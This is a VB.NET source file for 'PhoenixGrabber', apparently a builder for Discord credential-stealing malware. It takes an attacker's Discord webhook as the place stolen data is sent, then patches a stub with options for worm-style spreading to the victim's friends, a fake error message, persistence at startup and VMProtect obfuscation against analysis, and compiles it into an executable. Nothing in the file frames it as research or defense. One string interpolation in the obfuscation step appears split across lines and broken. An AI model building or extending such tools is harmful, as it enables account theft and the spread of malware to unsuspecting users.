Imports System
Imports System.CodeDom.Compiler
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.IO

' 
'       │ Author       : extatent
'       │ Name         : PhoenixGrabber
'       │ GitHub       : https://github.com/extatent
'

Namespace PhoenixGrabber
	Friend Class Program
		#Region "Configuration"
		Private Shared Webhook As String
		Private Shared SpreadMode As Boolean = False
		Private Shared WormMessage As String
		Private Shared FakeError As Boolean = False
		Private Shared FakeErrorMessage As String
		Private Shared RunOnStartup As Boolean = False
		Private Shared Obfuscate As Boolean = False
		Private Shared FileName As String
		#End Region

		#Region "Main"
		Shared Sub Main()
			Console.Title = "Phoenix Grabber"
			Console.Write("Discord Webhook: ")
			Webhook = Console.ReadLine()
			Console.Clear()
			Console.WriteLine("Sends your message to all friends." & ControlChars.Lf)
			Console.Write("Spread Mode (Y/N): ")
			If Console.ReadLine().ToLower() = "y" Then
				SpreadMode = True
				Console.Clear()
				Console.WriteLine("Enter the message you want the user to spread (the message can include invite links, download urls and so on)." & ControlChars.Lf)
				Console.Write("Message: ")
				WormMessage = Console.ReadLine()
			End If
			Console.Clear()
			Console.WriteLine("Shows a fake error after opening the program." & ControlChars.Lf)
			Console.Write("Fake Error (Y/N): ")
			If Console.ReadLine().ToLower() = "y" Then
				FakeError = True
				Console.Clear()
				Console.WriteLine("Enter the fake error message." & ControlChars.Lf)
				Console.Write("Message: ")
				FakeErrorMessage = Console.ReadLine()
			End If
			Console.Clear()
			Console.WriteLine("Runs the program once the computer is started." & ControlChars.Lf)
			Console.Write("Run On Startup: (Y/N): ")
			If Console.ReadLine().ToLower() = "y" Then
				RunOnStartup = True
			End If
			Console.Clear()
			Console.WriteLine("Protects the file from being decompiled." & ControlChars.Lf)
			Console.Write("Obfuscate: (Y/N): ")
			If Console.ReadLine().ToLower() = "y" Then
				Obfuscate = True
			End If
			Console.Clear()
			Console.Write("File Name: ")
			FileName = Console.ReadLine()
			Console.Clear()
			Console.WriteLine("Building stub")
			Compile()
			Console.ReadKey()
		End Sub
		#End Region

		#Region "Base"
		Private Shared Function Base(ByVal stub As String) As String
			stub = stub.Replace("Webhook", Webhook)

			If SpreadMode = True Then
				stub = stub.Replace("//SpreadMode", $"SpreadMode(""{WormMessage}"");")
			End If

			If FakeError = True Then
				stub = stub.Replace("//FakeError", $"MessageBox.Show(""{FakeErrorMessage}"", ""Error"", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);")
			End If

			If RunOnStartup = True Then
				stub = stub.Replace("//RunOnStartup", "RunOnStartup();")
			End If

			Return stub
		End Function
		#End Region

		#Region "Compile"
		Private Shared Sub Compile()
			Dim stub As String = My.Resources.Stub
			stub = Base(stub)
			Dim code As New List(Of String)()
			code.Add(stub)
			Dim provider As CodeDomProvider = CodeDomProvider.CreateProvider("CSharp")
			Dim compars As New CompilerParameters()
			compars.ReferencedAssemblies.Add("System.dll")
			compars.ReferencedAssemblies.Add("System.Linq.dll")
			compars.ReferencedAssemblies.Add("System.Windows.Forms.dll")
			compars.ReferencedAssemblies.Add("System.Core.dll")
			compars.ReferencedAssemblies.Add("Microsoft.CSharp.dll")
			compars.ReferencedAssemblies.Add("System.Security.dll")
			compars.ReferencedAssemblies.Add(Directory.GetCurrentDirectory() & "\Newtonsoft.Json.dll")
			compars.ReferencedAssemblies.Add(Directory.GetCurrentDirectory() & "\BouncyCastle.Crypto.dll")
			compars.GenerateExecutable = True
			compars.GenerateInMemory = False
			compars.TreatWarningsAsErrors = False
			compars.CompilerOptions &= "/t:winexe /unsafe /platform:x86"
			If FileName.Contains(" ") Then
				FileName = FileName.Replace(" ", "_")
			End If
			If Obfuscate = True Then
				compars.OutputAssembly = Path.GetTempPath() & $"\{FileName}.exe"
			Else
				compars.OutputAssembly = Directory.GetCurrentDirectory() & $"\{FileName}.exe"
			End If
			Dim res As CompilerResults = provider.CompileAssemblyFromSource(compars, code.ToArray())
			Console.Clear()
			If res.Errors.Count > 0 Then
				For Each [error] As CompilerError In res.Errors
					Console.WriteLine([error])
				Next [error]
			Else
				If Obfuscate = True Then
					Try
						Console.WriteLine("Obfuscating")

						Using stream = New FileStream(Path.GetTempPath() & "\VMProtect_Con.exe", FileMode.Create, FileAccess.Write)
							stream.Write(My.Resources.VMProtect_Con, 0, My.Resources.VMProtect_Con.Length)
						End Using

						Dim p As New Process()
						p.StartInfo.FileName = "cmd.exe"
						p.StartInfo.WorkingDirectory = Path.GetTempPath()
						p.StartInfo.Arguments = $"/C VMProtect_Con {Path.GetTempPath() + $"\\
							FileName
						.exe"} {Directory.GetCurrentDirectory() + $"\\
							FileName
						.exe"}"
						p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
						p.Start()
						p.WaitForExit()

						If File.Exists(Path.GetTempPath() & "\VMProtect_Con.exe") Then
							File.Delete(Path.GetTempPath() & "\VMProtect_Con.exe")
						End If
						If File.Exists(Path.GetTempPath() & $"\{FileName}.exe") Then
							File.Delete(Path.GetTempPath() & $"\{FileName}.exe")
						End If
					Catch e As Exception
						Console.Clear()
						Console.WriteLine(e.Message)
					End Try
				End If
				Console.Clear()
				Console.WriteLine($"File saved to: {Directory.GetCurrentDirectory() + $"\\{FileName}.exe"}" & ControlChars.Lf & "Press any key to exit.")
				Console.ReadKey()
				Environment.Exit(0)
			End If
		End Sub
		#End Region
	End Class
End Namespace
